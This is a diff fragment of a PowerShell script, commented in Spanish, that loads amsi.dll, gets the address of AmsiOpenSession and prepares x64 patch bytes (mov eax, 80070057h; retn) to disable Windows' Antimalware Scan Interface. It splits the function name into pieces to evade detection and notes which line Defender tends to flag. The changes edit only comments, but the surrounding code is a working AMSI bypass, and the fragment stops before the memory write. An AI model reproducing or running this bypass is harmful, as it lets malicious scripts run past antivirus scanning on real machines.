@@ -16,13 +16,13 @@ public class Class {
 }
 "@
 Add-Type $bypass  #definimos la clase .NET
-$parche64 = [Byte[]](0xb8,0x57,0x00,0x07,0x80,0xc3)  #Ensamblador vamos a inyectar. Solo funcional para x64
+$parche64 = [Byte[]](0xb8,0x57,0x00,0x07,0x80,0xc3)  #Código ensamblador que se va a inyectar. Solo funcional para x64
 Write-Output "[+] Parche $parche64"
 Write-Output "[+]Bytes a inyectar al principio de opensession"
 Write-Output "[+]08 57 00 07 80          mov     eax, 80070057h
 C3                      retn"
 $asd = [Class]::LoadLibrary("amsi.dll") #Cargamos amsi
-$punterofuncion = [Class]::GetProcAddress($asd, "Ams"+"iOpenS"+"ession") #Cargamos el puntero
+$punterofuncion = [Class]::GetProcAddress($asd, "Ams"+"iOpenS"+"ession") #Cargamos el puntero. Apartado que suele generar detecciones del Defender.
 $a=$punterofuncion.ToInt64()
 $punterofuncion = [IntPtr] $a
 $oldProtect = 0
